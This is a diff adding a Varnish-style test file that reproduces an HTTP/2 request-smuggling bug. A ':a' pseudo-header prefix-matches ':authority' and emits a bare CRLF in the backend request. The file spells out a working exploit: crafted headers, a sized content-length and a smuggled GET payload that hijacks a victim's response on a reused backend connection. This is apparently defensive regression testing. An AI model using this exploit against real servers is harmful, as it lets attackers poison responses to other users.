@@ -1,0 +1,84 @@
+vtest "H2 :a prefix-match → bare CRLF in bereq → backend request smuggling"
+
+# Root cause: cache_http2_hpack.c:216 Tstrcmp(nm,":authority") prefix-matches
+# `:a`. With a 2-byte value, out_u = 2+2+2 = 6; after `hdr.b += 6` we have
+# hdr.b == hdr.e. The zero-Tlen txt is stored at hp->hd[nhd++], survives
+# http_FilterReq, and HTTP1_Write emits it as a bare "\r\n" — terminating
+# the bereq header block early.
+#
+# Varnish does not enforce RFC 9113 §8.3 pseudo-header ordering, so the
+# attacker places `content-length` BEFORE `:a`. The truncated bereq carries
+# CL=N; everything after the bare CRLF (the post-:a headers + Varnish-added
+# headers + the H2 DATA body) is treated by the backend as N bytes of body
+# followed by leftover. By choosing N == len(post-:a leftover), the attacker's
+# DATA payload (arbitrary bytes) lands verbatim on the recycled backend
+# connection as a smuggled request.
+#
+# Measured (h2_smuggle_probe.vtc): BereqAcct hdrbytes=172, backend rxhdrlen=63
+# → leftover L = 172 - 63 = 109 bytes for this exact header set.
+
+server s1 {
+	# 1) Attacker's truncated bereq. Backend sees only headers before
+	#    the bare CRLF, with CL=109; reads 109 body bytes (= the leftover).
+	rxreq
+	expect req.method == "POST"
+	expect req.url == "/attacker"
+	expect req.http.content-length == "109"
+	expect req.http.host == <undef>
+	expect req.http.probe == <undef>
+	expect req.bodylen == 109
+	txresp -hdr "X-Which: attacker"
+
+	# 2) Attacker's H2 DATA payload (109 bytes) is now first on the wire.
+	#    It is the smuggled request, with CL sized to swallow padding +
+	#    the victim's entire bereq.
+	rxreq
+	expect req.method == "GET"
+	expect req.url == "/smuggled"
+	expect req.http.X-Smuggled == "yes"
+	expect req.http.content-length == "171"
+	# Victim's bereq is inside this body — never processed as a request.
+	expect req.body ~ "GET /victim "
+	txresp -hdr "X-Which: smuggled"
+} -start
+
+vinyl v1 -arg "-p feature=+http2" -vcl+backend {
+	sub vcl_recv { return (pass); }
+} -start
+
+client c1 {
+	stream 1 {
+		txreq -noadd \
+		    -idxHdr 3 \
+		    -litIdxHdr never 4 plain "/attacker" \
+		    -idxHdr 7 \
+		    -hdr "content-length" "109" \
+		    -litHdr never plain ":a" plain "xx" \
+		    -hdr "probe" "pad" \
+		    -hdr "host" "example.com" \
+		    -nostrend
+		# DATA = exactly 109 bytes = what ends up on the recycled conn.
+		# Smuggled request (72) + 37 padding; smuggled CL=172 will
+		# consume the 37 padding + victim's 135-byte bereq.
+		txdata -data "GET /smuggled HTTP/1.1\r\nHost: x\r\nX-Smuggled: yes\r\nContent-Length: 171\r\n\r\nPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP"
+		rxresp
+		expect resp.status == 200
+		expect resp.http.X-Which == "attacker"
+	} -run
+} -run
+
+delay 0.1
+
+# Victim on a separate H1 connection. Varnish reuses the desync'd backend
+# conn; backend already has the smuggled request queued, so the victim's
+# bereq is consumed as the smuggled request's body and the victim receives
+# the response intended for /smuggled.
+client c2 {
+	txreq -url "/victim" -hdr "Host: example.com"
+	rxresp
+	expect resp.status == 200
+	expect resp.http.X-Which == "smuggled"
+} -run
+
+vinyl v1 -vsl_catchup
+vinyl v1 -expect MAIN.backend_reuse == 1
